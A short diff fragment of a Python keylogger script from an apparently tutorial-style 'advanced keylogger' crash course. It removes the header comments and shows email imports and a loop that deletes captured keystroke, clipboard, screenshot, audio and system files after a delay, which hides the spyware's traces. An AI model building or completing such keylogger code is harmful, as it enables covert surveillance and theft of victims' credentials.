@@ -1,8 +1,3 @@
-# keylogger.py
-# Create an Advanced Keylogger in Python - Crash Course notes
-# Author: Grant Collins
-
-# Libraries
 
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -239,4 +234,5 @@ time.sleep(120)
 delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
 for file in delete_files:
     os.remove(file_merge + file)
+
 
